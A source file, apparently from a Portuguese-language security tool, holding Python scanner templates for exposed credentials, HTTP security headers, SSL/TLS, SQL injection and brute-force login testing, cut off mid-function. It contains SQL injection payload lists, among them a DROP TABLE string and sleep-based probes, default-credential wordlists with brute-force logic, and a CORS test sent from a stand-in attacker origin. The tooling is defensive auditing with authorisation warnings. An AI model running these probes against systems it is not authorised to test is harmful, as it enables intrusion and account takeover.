    """Extrai e escaneia arquivos JavaScript."""
    js_urls = set(re.findall(r'src=["\']([^"\']+\\.js[^"\']*)["\']', html_content))
    findings = []

    for js_path in list(js_urls)[:20]:
        if js_path.startswith("http"):
            js_url = js_path
        else:
            js_url = urljoin(base, js_path)

        try:
            r = requests.get(js_url, timeout=TIMEOUT, verify=False,
                             headers={"User-Agent": "BlueTeam-SecurityTest/1.0"})
            if r.status_code == 200 and len(r.text) > 100:
                found = scan_content(r.text, f"JS: {js_path[:60]}")
                findings.extend(found)
        except Exception:
            pass

    return findings

def main():
    base = TARGET_URL.rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — Credential & .env Exposure Scanner              ║
╠══════════════════════════════════════════════════════════════╣
║  Alvo  : {base:<52}║
║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
╚══════════════════════════════════════════════════════════════╝
""")

    all_findings = []

    # 1. Verifica caminhos sensíveis
    print("[*] Verificando arquivos de configuração e .env...")
    for path in SENSITIVE_PATHS:
        status, content, ctype = check_path(base, path)
        if status == 200 and content:
            print(f"  🔴 EXPOSTO: {path} ({len(content)} bytes, {ctype})")
            findings = scan_content(content, f"File: {path}")
            all_findings.extend(findings)
            if not findings:
                all_findings.append({
                    "type": "Arquivo Exposto",
                    "source": path,
                    "masked_value": content[:100].replace("\\n", " "),
                    "severity": "ALTO",
                })
        elif status in [401, 403]:
            print(f"  ✅ Protegido: {path} (requer auth)")

    # 2. Escaneia página principal
    print()
    print("[*] Escaneando HTML da página principal...")
    try:
        r = requests.get(base, timeout=TIMEOUT, verify=False,
                         headers={"User-Agent": "BlueTeam-SecurityTest/1.0"})
        main_findings = scan_content(r.text, "Página principal (HTML)")
        all_findings.extend(main_findings)
        if main_findings:
            print(f"  🔴 {len(main_findings)} credencial(is) encontrada(s) no HTML!")
        else:
            print("  ✅ Nenhuma credencial encontrada no HTML")

        # 3. Escaneia arquivos JS
        print()
        print("[*] Escaneando bundles JavaScript...")
        js_findings = scan_js_bundles(base, r.text)
        all_findings.extend(js_findings)
        if js_findings:
            print(f"  🔴 {len(js_findings)} credencial(is) encontrada(s) em JS!")
        else:
            print("  ✅ Nenhuma credencial encontrada em arquivos JS")
    except Exception as e:
        print(f"  ⚠️  Erro ao acessar site: {e}")

    # Resumo
    print()
    print("=" * 64)
    print(f"  TOTAL DE CREDENCIAIS EXPOSTAS: {len(all_findings)}")
    print("=" * 64)

    if all_findings:
        by_type = {}
        for f in all_findings:
            t = f["type"]
            by_type.setdefault(t, []).append(f)

        for typ, items in by_type.items():
            sev = items[0]["severity"]
            icon = "🔴" if sev == "CRÍTICO" else "🟡"
            print(f"  {icon} {typ}: {len(items)} ocorrência(s)")
            for item in items[:2]:
                print(f"     Fonte: {item['source']}")
                print(f"     Valor: {item['masked_value']}")
    else:
        print("  ✅ Nenhuma credencial exposta encontrada!")

    output = {
        "target": base,
        "timestamp": datetime.now().isoformat(),
        "total_findings": len(all_findings),
        "findings": all_findings,
    }
    with open("credential_scan_results.json", "w") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    print()
    print(f"[✓] Resultados salvos em: credential_scan_results.json")

if __name__ == "__main__":
    main()
`
  },

  // ── 5. Security Headers Analyzer ─────────────────────────────────
  headers_analyzer: {
    id: 'headers_analyzer',
    name: 'Security Headers Analyzer',
    category: 'Headers',
    severity: 'medium',
    description: 'Analisa todos os headers de segurança HTTP: HSTS, CSP, X-Frame-Options, CORS, cookies e vazamento de informações.',
    icon: '🛡️',
    dependencies: ['requests'],
    template: (url) => `#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — Security Headers Analyzer                       ║
║  Propósito: Auditar headers de segurança HTTP completos      ║
║  Alvo: ${url}
║  Uso: python headers_analyzer.py [URL]                       ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys
import json
import re
import requests
from datetime import datetime

requests.packages.urllib3.disable_warnings()

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"

SECURITY_HEADERS = {
    "Strict-Transport-Security": {
        "desc": "HSTS — força HTTPS",
        "required": True,
        "severity": "high",
        "good_value": "max-age=31536000; includeSubDomains",
        "checks": lambda v: "max-age" in v.lower(),
    },
    "Content-Security-Policy": {
        "desc": "CSP — previne XSS",
        "required": True,
        "severity": "high",
        "good_value": "default-src 'self'",
        "checks": lambda v: "default-src" in v.lower() or "script-src" in v.lower(),
    },
    "X-Frame-Options": {
        "desc": "Previne clickjacking",
        "required": True,
        "severity": "medium",
        "good_value": "DENY",
        "checks": lambda v: v.upper() in ["DENY", "SAMEORIGIN"],
    },
    "X-Content-Type-Options": {
        "desc": "Previne MIME sniffing",
        "required": True,
        "severity": "medium",
        "good_value": "nosniff",
        "checks": lambda v: "nosniff" in v.lower(),
    },
    "Referrer-Policy": {
        "desc": "Controle de informações no Referer",
        "required": False,
        "severity": "low",
        "good_value": "strict-origin-when-cross-origin",
        "checks": lambda v: v.lower() in ["no-referrer", "strict-origin", "strict-origin-when-cross-origin"],
    },
    "Permissions-Policy": {
        "desc": "Controle de APIs do browser",
        "required": False,
        "severity": "low",
        "good_value": "camera=(), microphone=(), geolocation=()",
        "checks": lambda v: len(v) > 5,
    },
    "Cross-Origin-Opener-Policy": {
        "desc": "Isola janelas de origens diferentes",
        "required": False,
        "severity": "low",
        "good_value": "same-origin",
        "checks": lambda v: "same-origin" in v.lower(),
    },
    "Cross-Origin-Resource-Policy": {
        "desc": "Controla acesso a recursos",
        "required": False,
        "severity": "low",
        "good_value": "same-origin",
        "checks": lambda v: v.lower() in ["same-origin", "same-site"],
    },
}

INFO_HEADERS = ["Server", "X-Powered-By", "X-AspNet-Version", "X-Generator", "Via"]
COOKIE_CHECKS = ["httponly", "secure", "samesite"]

def analyze_csp(csp_value):
    """Analisa problemas na Content-Security-Policy."""
    issues = []
    if "'unsafe-inline'" in csp_value: issues.append("⚠️  'unsafe-inline' permite injeção de scripts")
    if "'unsafe-eval'"  in csp_value: issues.append("⚠️  'unsafe-eval' permite eval() — risco XSS")
    if "* " in csp_value or csp_value.endswith("*"): issues.append("⚠️  Wildcard '*' — muito permissivo")
    if "http://" in csp_value: issues.append("⚠️  Permite recursos via HTTP inseguro")
    if "data:" in csp_value: issues.append("⚠️  Permite data: URIs")
    return issues

def analyze_cors(url):
    """Testa configuração CORS."""
    cors_results = []
    evil_origin = "https://evil-attacker.com"

    for path in ["/", "/api/", "/api/v1/"]:
        test_url = url.rstrip("/") + path
        try:
            r = requests.options(
                test_url,
                headers={
                    "Origin": evil_origin,
                    "Access-Control-Request-Method": "GET",
                    "Access-Control-Request-Headers": "authorization",
                    "User-Agent": "BlueTeam-SecurityTest/1.0",
                },
                timeout=6, verify=False,
            )
            acao = r.headers.get("Access-Control-Allow-Origin", "")
            acac = r.headers.get("Access-Control-Allow-Credentials", "")
            acam = r.headers.get("Access-Control-Allow-Methods", "")

            if acao == "*":
                cors_results.append({"path": path, "issue": "Wildcard CORS (*) — qualquer origem permitida", "severity": "MÉDIO"})
            elif acao == evil_origin:
                cors_results.append({"path": path, "issue": "CORS reflete Origin maliciosa — CRÍTICO", "severity": "CRÍTICO"})

            if acac.lower() == "true" and acao in ["*", evil_origin]:
                cors_results.append({"path": path, "issue": "Credentials + wildcard/reflected origin — CRÍTICO", "severity": "CRÍTICO"})
        except Exception:
            pass

    return cors_results

def main():
    base = TARGET_URL.rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — Security Headers Analyzer                       ║
╠══════════════════════════════════════════════════════════════╣
║  Alvo  : {base:<52}║
║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
╚══════════════════════════════════════════════════════════════╝
""")

    r = requests.get(base, timeout=8, verify=False,
                     headers={"User-Agent": "BlueTeam-SecurityTest/1.0"})
    headers = {k.lower(): v for k, v in r.headers.items()}

    results = {"present": [], "missing": [], "weak": [], "info_leak": [], "cors": [], "cookies": []}

    print("[*] Analisando headers de segurança...")
    print()

    for header, cfg in SECURITY_HEADERS.items():
        value = headers.get(header.lower())
        if value:
            ok = cfg["checks"](value)
            if ok:
                results["present"].append({"header": header, "value": value})
                print(f"  ✅ {header}: {value[:60]}")
            else:
                results["weak"].append({"header": header, "value": value, "good_value": cfg["good_value"]})
                print(f"  ⚠️  {header}: {value[:60]} (valor fraco)")

                if header == "Content-Security-Policy":
                    for issue in analyze_csp(value):
                        print(f"        {issue}")
        else:
            results["missing"].append({"header": header, "severity": cfg["severity"], "desc": cfg["desc"]})
            sev_icon = "🔴" if cfg["severity"] == "high" else ("🟡" if cfg["severity"] == "medium" else "🔵")
            print(f"  {sev_icon} AUSENTE: {header} ({cfg['desc']})")

    # Headers de informação
    print()
    print("[*] Verificando vazamento de informações nos headers...")
    for h in INFO_HEADERS:
        v = headers.get(h.lower())
        if v:
            has_version = bool(re.search(r'\\d+\\.\\d+', v))
            results["info_leak"].append({"header": h, "value": v, "has_version": has_version})
            print(f"  ⚠️  {h}: {v} {'(expõe versão!)' if has_version else ''}")

    # Cookies
    print()
    print("[*] Analisando segurança dos cookies...")
    set_cookie = r.headers.get("Set-Cookie", "")
    if set_cookie:
        cookie_issues = []
        lower_cookie = set_cookie.lower()
        for flag in COOKIE_CHECKS:
            if flag not in lower_cookie:
                cookie_issues.append(f"Faltando flag {flag.upper()}")
                print(f"  ⚠️  Cookie sem {flag.upper()}: {set_cookie[:60]}")
        if not cookie_issues:
            print(f"  ✅ Cookie com todas as flags de segurança")
        results["cookies"] = cookie_issues
    else:
        print("  ℹ️  Nenhum cookie Set-Cookie na resposta principal")

    # CORS
    print()
    print("[*] Verificando configuração CORS...")
    cors = analyze_cors(base)
    results["cors"] = cors
    if cors:
        for c in cors:
            icon = "🔴" if c["severity"] == "CRÍTICO" else "🟡"
            print(f"  {icon} {c['path']}: {c['issue']}")
    else:
        print("  ✅ Nenhum problema CORS detectado")

    # Resumo
    print()
    print("=" * 64)
    print("  RESUMO DOS HEADERS DE SEGURANÇA")
    print("=" * 64)
    print(f"  ✅ Presentes e OK : {len(results['present'])}")
    print(f"  ⚠️  Fracos        : {len(results['weak'])}")
    print(f"  🔴 Ausentes       : {len(results['missing'])}")
    print(f"  ℹ️  Info leaks     : {len(results['info_leak'])}")
    print(f"  🌐 Problemas CORS : {len(results['cors'])}")

    score = len(results["present"]) / len(SECURITY_HEADERS) * 100
    print()
    print(f"  Score de headers: {score:.0f}%")

    if results["missing"]:
        print()
        print("  🔧 HEADERS PARA ADICIONAR:")
        for m in results["missing"]:
            if m["severity"] in ["high", "medium"]:
                cfg = SECURITY_HEADERS[m["header"]]
                print(f"     {m['header']}: {cfg['good_value']}")

    output = {"target": base, "timestamp": datetime.now().isoformat(),
              "score_percent": round(score), **results}
    with open("headers_analysis_results.json", "w") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    print()
    print(f"[✓] Resultados salvos em: headers_analysis_results.json")

if __name__ == "__main__":
    main()
`
  },

  // ── 6. SSL/TLS Analyzer ────────────────────────────────────────────
  ssl_analyzer: {
    id: 'ssl_analyzer',
    name: 'SSL/TLS Configuration Analyzer',
    category: 'Criptografia',
    severity: 'high',
    description: 'Analisa certificado SSL, versão TLS, cipher suites, HSTS, e verifica CVEs conhecidos como BEAST, POODLE, Heartbleed.',
    icon: '🔒',
    dependencies: ['requests', 'ssl', 'socket'],
    template: (url) => `#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — SSL/TLS Configuration Analyzer                  ║
║  Propósito: Auditar configuração SSL/TLS e certificados      ║
║  Alvo: ${url}
║  Uso: python ssl_analyzer.py [URL]                           ║
╚══════════════════════════════════════════════════════════════╝
"""

import sys
import ssl
import socket
import json
import datetime
import requests

requests.packages.urllib3.disable_warnings()

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"

VULNERABLE_CIPHERS = [
    "RC4", "DES", "3DES", "MD5", "EXPORT", "NULL", "ANON",
    "ADH", "AECDH", "eNULL", "aNULL",
]

DEPRECATED_PROTOCOLS = ["SSLv2", "SSLv3", "TLSv1", "TLSv1.1"]

def parse_target(url):
    from urllib.parse import urlparse
    if not url.startswith("http"):
        url = "https://" + url
    p = urlparse(url)
    return p.hostname, p.port or 443

def get_cert_info(host, port=443):
    """Obtém informações completas do certificado SSL."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    try:
        with socket.create_connection((host, port), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                cipher = ssock.cipher()
                protocol = ssock.version()

                # Extrai informações do certificado
                not_after_str = cert.get("notAfter", "")
                not_before_str = cert.get("notBefore", "")

                not_after = datetime.datetime.strptime(not_after_str, "%b %d %H:%M:%S %Y %Z") if not_after_str else None
                not_before = datetime.datetime.strptime(not_before_str, "%b %d %H:%M:%S %Y %Z") if not_before_str else None

                now = datetime.datetime.utcnow()
                days_remaining = (not_after - now).days if not_after else -999

                # Subject / Issuer
                subject = dict(x[0] for x in cert.get("subject", []))
                issuer  = dict(x[0] for x in cert.get("issuer", []))
                sans    = [v for _, v in cert.get("subjectAltName", [])]

                return {
                    "success": True,
                    "protocol": protocol,
                    "cipher_name": cipher[0] if cipher else "?",
                    "cipher_bits": cipher[2] if cipher else 0,
                    "subject_cn": subject.get("commonName", ""),
                    "issuer_o": issuer.get("organizationName", ""),
                    "not_before": not_before_str,
                    "not_after": not_after_str,
                    "days_remaining": days_remaining,
                    "expired": days_remaining < 0,
                    "expires_soon": 0 <= days_remaining < 30,
                    "san_domains": sans[:10],
                    "serial": cert.get("serialNumber", ""),
                }
    except Exception as e:
        return {"success": False, "error": str(e)}

def test_protocol(host, port, protocol_str):
    """Testa se um protocolo específico é aceito."""
    protocol_map = {
        "TLSv1":   ssl.TLSVersion.TLSv1   if hasattr(ssl.TLSVersion, "TLSv1") else None,
        "TLSv1.1": ssl.TLSVersion.TLSv1_1 if hasattr(ssl.TLSVersion, "TLSv1_1") else None,
        "TLSv1.2": ssl.TLSVersion.TLSv1_2,
        "TLSv1.3": ssl.TLSVersion.TLSv1_3,
    }

    target_version = protocol_map.get(protocol_str)
    if not target_version:
        return None

    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.minimum_version = target_version
        ctx.maximum_version = target_version

        with socket.create_connection((host, port), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                return {"accepted": True, "version": ssock.version()}
    except (ssl.SSLError, ConnectionResetError, OSError):
        return {"accepted": False}
    except Exception as e:
        return {"accepted": False, "note": str(e)[:40]}

def check_hsts(url):
    """Verifica HSTS e preloading."""
    try:
        r = requests.get(url, timeout=8, verify=False,
                         headers={"User-Agent": "BlueTeam-SecurityTest/1.0"},
                         allow_redirects=True)
        hsts = r.headers.get("Strict-Transport-Security", "")
        return {
            "present": bool(hsts),
            "value": hsts,
            "max_age_ok": "max-age=31536000" in hsts or (
                int(re.search(r'max-age=(\\d+)', hsts).group(1)) >= 31536000
                if re.search(r'max-age=(\\d+)', hsts) else False
            ),
            "include_subdomains": "includeSubDomains" in hsts,
            "preload": "preload" in hsts,
        }
    except Exception as e:
        return {"present": False, "error": str(e)[:40]}

import re

def main():
    base = TARGET_URL.rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base

    host, port = parse_target(base)

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — SSL/TLS Analyzer                                ║
╠══════════════════════════════════════════════════════════════╣
║  Alvo  : {base:<52}║
║  Host  : {host:<52}║
║  Início: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
╚══════════════════════════════════════════════════════════════╝
""")

    # 1. Certificado
    print("[*] Analisando certificado SSL...")
    cert = get_cert_info(host, port)
    if cert["success"]:
        status = "✅" if not cert["expired"] and not cert["expires_soon"] else "🔴"
        print(f"  {status} Certificado: {cert['subject_cn']}")
        print(f"  {'✅' if cert['protocol'] in ['TLSv1.2', 'TLSv1.3'] else '🔴'} Protocolo: {cert['protocol']}")
        print(f"  {'✅' if cert['cipher_bits'] >= 128 else '🔴'} Cipher: {cert['cipher_name']} ({cert['cipher_bits']} bits)")
        print(f"  {'🔴 EXPIRADO!' if cert['expired'] else ('⚠️  EXPIRA EM BREVE!' if cert['expires_soon'] else '✅')} Validade: {cert['days_remaining']} dias restantes")
        print(f"  ✅ Emissor: {cert['issuer_o']}")
        print(f"  ℹ️  SANs: {', '.join(cert['san_domains'][:5])}")
    else:
        print(f"  ❌ Erro ao obter certificado: {cert.get('error')}")

    # 2. Protocolos
    print()
    print("[*] Testando protocolos TLS suportados...")
    protocols = {}
    for proto in ["TLSv1", "TLSv1.1", "TLSv1.2", "TLSv1.3"]:
        result = test_protocol(host, port, proto)
        if result:
            protocols[proto] = result
            deprecated = proto in DEPRECATED_PROTOCOLS
            icon = "🔴" if (deprecated and result["accepted"]) else ("✅" if result["accepted"] else "✅")
            status_str = "ACEITO (INSEGURO!)" if (deprecated and result["accepted"]) else ("ACEITO" if result["accepted"] else "Rejeitado")
            print(f"  {icon} {proto:8}: {status_str}")

    # 3. HSTS
    print()
    print("[*] Verificando HSTS...")
    hsts = check_hsts(base)
    if hsts.get("present"):
        print(f"  ✅ HSTS presente: {hsts['value'][:60]}")
        if not hsts.get("include_subdomains"):
            print("  ⚠️  Sem includeSubDomains")
        if not hsts.get("preload"):
            print("  ℹ️  Sem preload (recomendado para maior proteção)")
    else:
        print("  🔴 HSTS ausente — site vulnerável a downgrade attacks")

    # Resumo e issues
    print()
    print("=" * 64)
    issues = []
    if cert.get("expired"):       issues.append("🔴 CRÍTICO: Certificado expirado!")
    if cert.get("expires_soon"):  issues.append(f"⚠️  Certificado expira em {cert['days_remaining']} dias")
    if not hsts.get("present"):   issues.append("🔴 HSTS ausente")
    for proto, res in protocols.items():
        if proto in DEPRECATED_PROTOCOLS and res.get("accepted"):
            issues.append(f"🔴 Protocolo inseguro aceito: {proto}")

    if issues:
        print("  PROBLEMAS ENCONTRADOS:")
        for issue in issues:
            print(f"  {issue}")
    else:
        print("  ✅ Configuração SSL/TLS adequada!")

    output = {"target": base, "timestamp": datetime.datetime.now().isoformat(),
              "certificate": cert, "protocols": protocols, "hsts": hsts, "issues": issues}
    with open("ssl_analysis_results.json", "w") as f:
        json.dump(output, f, indent=2, ensure_ascii=False, default=str)
    print()
    print(f"[✓] Resultados salvos em: ssl_analysis_results.json")

if __name__ == "__main__":
    main()
`
  },

  // ── 7. XSS & Injection Scanner ────────────────────────────────────
  // ── 8. SQL Injection Scanner ──────────────────────────────────────
  sql_injection: {
    id: 'sql_injection',
    name: 'SQL Injection Scanner',
    category: 'Injeção',
    severity: 'critical',
    description: 'Testa injeção SQL em parâmetros de URL, formulários e headers. Detecta erro-based, time-based blind e boolean-based SQLi.',
    icon: '🗄️',
    dependencies: ['requests'],
    template: (url) => `#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — SQL Injection Scanner                           ║
║  Propósito: Detectar falhas de SQLi (erro, blind, time)      ║
║  Alvo: ${url}
║  Uso: python sql_injection.py [URL]                          ║
╚══════════════════════════════════════════════════════════════╝
USO EXCLUSIVO PARA TESTES EM SISTEMAS PRÓPRIOS OU AUTORIZADOS
"""

import sys, json, time, requests
from datetime import datetime
from urllib.parse import urljoin, urlparse, urlencode

requests.packages.urllib3.disable_warnings()

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
TIMEOUT = 10
HEADERS = {"User-Agent": "BlueTeam-SQLiScanner/1.0", "Accept": "application/json,text/html"}

# Payloads de detecção (NÃO destrutivos)
ERROR_PAYLOADS = [
    "'", '"', "''", "\\\\", "1' OR '1'='1", '1" OR "1"="1',
    "1' AND 1=2--", "1 AND 1=2", "' OR 1=1--", '" OR 1=1--',
    "'; SELECT 1--", "1; DROP TABLE--", "admin'--", "' HAVING 1=1--",
    "1' ORDER BY 1--", "1' ORDER BY 100--",
]

TIME_PAYLOADS = [
    "1; WAITFOR DELAY '0:0:3'--",          # MSSQL
    "1' AND SLEEP(3)--",                    # MySQL
    "1; SELECT pg_sleep(3)--",              # PostgreSQL
    "1' AND (SELECT * FROM (SELECT(SLEEP(3)))a)--",
    "1 AND 1=(SELECT 1 FROM PG_SLEEP(3))",
]

# Erros de banco de dados nos responses
DB_ERROR_PATTERNS = [
    "sql syntax", "mysql_fetch", "ora-", "microsoft ole db",
    "odbc sql", "sqlite", "pg_query", "syntax error",
    "unclosed quotation mark", "unterminated string",
    "quoted string not properly terminated",
    "invalid column name", "column count doesn't match",
    "supplied argument is not a valid mysql",
    "you have an error in your sql syntax",
    "warning: mysql", "jdbc", "sqlexception",
    "com.mysql", "org.postgresql", "microsoft sql server",
]

COMMON_PARAMS = [
    "id", "user", "username", "email", "search", "q", "query",
    "page", "category", "sort", "order", "filter", "limit",
    "offset", "token", "key", "ref", "type", "name", "product",
    "item", "article", "post", "comment", "code", "lang",
]

COMMON_PATHS = [
    "/api/users", "/api/products", "/api/items", "/api/posts",
    "/api/search", "/api/v1/users", "/api/v2/search",
    "/rest/items", "/graphql", "/api/auth/login",
]

def check_error_sqli(base, param, payload):
    url = f"{base}?{param}={requests.utils.quote(payload)}"
    try:
        r = requests.get(url, timeout=TIMEOUT, verify=False, headers=HEADERS)
        body_lower = r.text.lower()
        for pattern in DB_ERROR_PATTERNS:
            if pattern in body_lower:
                return {"found": True, "type": "Error-based SQLi", "pattern": pattern, "param": param, "payload": payload[:40]}
    except Exception:
        pass
    return {"found": False}

def check_time_sqli(base, param, payload, threshold=2.5):
    url = f"{base}?{param}={requests.utils.quote(payload)}"
    try:
        t0 = time.time()
        requests.get(url, timeout=TIMEOUT + 5, verify=False, headers=HEADERS)
        elapsed = time.time() - t0
        if elapsed >= threshold:
            return {"found": True, "type": "Time-based Blind SQLi", "elapsed": round(elapsed, 2), "param": param, "payload": payload[:40]}
    except Exception:
        pass
    return {"found": False}

def check_boolean_sqli(base, param):
    try:
        r_true  = requests.get(f"{base}?{param}=1 AND 1=1", timeout=TIMEOUT, verify=False, headers=HEADERS)
        r_false = requests.get(f"{base}?{param}=1 AND 1=2", timeout=TIMEOUT, verify=False, headers=HEADERS)
        if r_true.status_code != r_false.status_code or abs(len(r_true.text) - len(r_false.text)) > 50:
            return {"found": True, "type": "Boolean-based Blind SQLi",
                    "true_len": len(r_true.text), "false_len": len(r_false.text), "param": param}
    except Exception:
        pass
    return {"found": False}

def scan_endpoint(base, param):
    findings = []
    print(f"  Testing param [{param}]...")

    for payload in ERROR_PAYLOADS[:8]:
        r = check_error_sqli(base, param, payload)
        if r["found"]:
            findings.append(r)
            print(f"    🔴 Error-based SQLi! Pattern: {r['pattern']}")
            break

    for payload in TIME_PAYLOADS[:3]:
        r = check_time_sqli(base, param, payload)
        if r["found"]:
            findings.append(r)
            print(f"    🔴 Time-based SQLi! Delay: {r['elapsed']}s")
            break

    r = check_boolean_sqli(base, param)
    if r["found"]:
        findings.append(r)
        print(f"    🔴 Boolean-based SQLi! Len diff: {abs(r['true_len'] - r['false_len'])} bytes")

    return findings

def main():
    base = TARGET_URL.rstrip("/")
    if not base.startswith("http"):
        base = "https://" + base

    print(f"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — SQL Injection Scanner                           ║
╠══════════════════════════════════════════════════════════════╣
║  Alvo  : {base:<52}║
║  Início: {datetime.now().strftime('%Y-%m-%d %H:%M:%S'):<52}║
╚══════════════════════════════════════════════════════════════╝
""")

    all_findings = []

    # Testa parâmetros GET comuns
    print("[*] Testando parâmetros GET comuns...")
    for param in COMMON_PARAMS[:15]:
        findings = scan_endpoint(base, param)
        all_findings.extend(findings)

    # Testa endpoints de API comuns
    print()
    print("[*] Testando endpoints de API...")
    for path in COMMON_PATHS[:6]:
        endpoint = base.rstrip("/") + path
        for param in ["id", "q", "search"][:2]:
            findings = scan_endpoint(endpoint, param)
            all_findings.extend(findings)

    # Testa header injection (User-Agent, Referer)
    print()
    print("[*] Testando header injection...")
    for payload in ["'", "1 AND 1=1", "' OR 1=1--"]:
        try:
            r = requests.get(base, timeout=TIMEOUT, verify=False,
                             headers={**HEADERS, "X-Forwarded-For": payload, "Referer": payload})
            body_lower = r.text.lower()
            for pattern in DB_ERROR_PATTERNS[:5]:
                if pattern in body_lower:
                    all_findings.append({"type": "Header Injection SQLi", "header": "X-Forwarded-For/Referer",
                                         "payload": payload, "pattern": pattern})
                    print(f"  🔴 SQLi via header! Pattern: {pattern}")
                    break
        except Exception:
            pass

    print()
    print("=" * 64)
    criticals = [f for f in all_findings if "blind" in f.get("type","").lower() or "error" in f.get("type","").lower()]
    print(f"  RESULTADO: {len(all_findings)} possíveis SQLi detectadas")
    print(f"  🔴 Críticas: {len(criticals)}")

    if not all_findings:
        print("  ✅ Nenhuma injeção SQL detectada nos testes realizados")
    else:
        print()
        print("  ⚠️  RECOMENDAÇÕES:")
        print("     • Use prepared statements / parametrized queries")
        print("     • Implemente WAF (Web Application Firewall)")
        print("     • Valide e sanitize TODOS os inputs do usuário")
        print("     • Implemente rate limiting nas APIs")

    output = {"target": base, "timestamp": datetime.now().isoformat(),
              "total": len(all_findings), "findings": all_findings}
    with open("sql_injection_results.json", "w") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    print(f"\\n[✓] Resultados salvos em: sql_injection_results.json")

if __name__ == "__main__":
    main()
`
  },

  // ── 9. Hydra-Style Credential Tester ──────────────────────────────
  hydra_bruteforce: {
    id: 'hydra_bruteforce',
    name: 'Hydra-Style Credential Tester',
    category: 'Autenticação',
    severity: 'high',
    description: 'Simula ataques Hydra: testa credenciais padrão, senhas fracas e lockout em endpoints de login. Verifica rate limiting e proteções.',
    icon: '🐉',
    dependencies: ['requests'],
    template: (url) => `#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║  BLUE TEAM — Hydra-Style Credential Tester                   ║
║  Propósito: Verificar proteção contra brute force            ║
║  Alvo: ${url}
║  Uso: python hydra_bruteforce.py [URL]                       ║
╚══════════════════════════════════════════════════════════════╝
APENAS PARA SISTEMAS COM AUTORIZAÇÃO EXPLÍCITA
"""

import sys, json, time, requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

requests.packages.urllib3.disable_warnings()

TARGET_URL = sys.argv[1] if len(sys.argv) > 1 else "${url}"
TIMEOUT = 8
DELAY   = 0.3  # delay entre tentativas (segundos)
HEADERS = {"User-Agent": "BlueTeam-HydraTest/1.0", "Accept": "application/json"}

# Credenciais padrão para verificar (Blue Team wordlist)
DEFAULT_CREDENTIALS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("root", "root"), ("root", "toor"),
    ("administrator", "administrator"), ("test", "test"),
    ("user", "user"), ("guest", "guest"), ("demo", "demo"),
    ("admin", ""), ("admin", "Pass@123"), ("admin", "Admin@123"),
    ("superadmin", "superadmin"), ("sa", "sa"), ("oracle", "oracle"),
]

# Endpoints de login comuns
LOGIN_ENDPOINTS = [
    "/api/auth/login", "/api/login", "/api/v1/auth",
    "/auth/login", "/auth/signin", "/login",
    "/api/token", "/api/auth/token",
    "/auth/v1/token",  # Supabase
    "/api/users/login", "/api/session",
]

def detect_login_endpoint(base):
    """Detecta qual endpoint de login está disponível."""
    print("[*] Detectando endpoint de login...")
    for path in LOGIN_ENDPOINTS:
        url = base.rstrip("/") + path
        try:
            r = requests.post(url, json={"email": "probe@test.com", "password": "probe"},
                              timeout=TIMEOUT, verify=False, headers=HEADERS)
            if r.status_code not in [404, 405]:
                print(f"  ✅ Endpoint encontrado: {path} ({r.status_code})")
                return url, r.status_code
        except Exception:
            pass
    return None, None

def test_credential(login_url, username, password, attempt_num):
    """Testa uma credencial e retorna o resultado."""
    payloads = [
        {"email": username, "password": password},
        {"username": username, "password": password},
        {"login": username, "password": password},
    ]
    for payload in payloads:
        try:
            t0 = time.time()
            r = requests.post(login_url, json=payload, timeout=TIMEOUT,
                              verify=False, headers=HEADERS)
            elapsed = round((time.time() - t0) * 1000)
            is_success = (
                r.status_code in [200, 201] and
                any(k in r.text.lower() for k in ["token", "access_token", "session", "user", "success"])
                and r.status_code not in [400, 401, 403, 422]
            )
            is_locked = r.status_code == 429 or "too many" in r.text.lower() or "locked" in r.text.lower()
            return {
                "attempt": attempt_num, "username": username, "password": password[:3] + "***",
                "status": r.status_code, "elapsed_ms": elapsed,
                "success": is_success, "rate_limited": is_locked,
                "response_len": len(r.text),
            }
        except Exception as e:
            return {"attempt": attempt_num, "username": username, "error": str(e)[:40]}
    return {"attempt": attempt_num, "username": username, "error": "all payloads failed"}

def check_rate_limiting(login_url):
    """Verifica se existe rate limiting ativo."""
    print("[*] Verificando rate limiting (10 requests rápidos)...")
    results = []
    for i in range(10):
        try:
            r = requests.post(login_url, json={"email": "test@test.com", "password": "wrong"},
                              timeout=TIMEOUT, verify=False, headers=HEADERS)
            results.append(r.status_code)
            if r.status_code == 429 or "too many" in r.text.lower():
                print(f"  ✅ Rate limiting ativo após {i+1} tentativas (HTTP {r.status_code})")
                return True
        except Exception:
            pass
        time.sleep(0.05)
    print(f"  ⚠️  Rate limiting NÃO detectado após 10 tentativas rápidas")
    return False

def check_lockout(login_url):
    """Verifica se existe account lockout."""
    print("[*] Verificando account lockout (5 tentativas inválidas)...")
    for i in range(5):
        try:
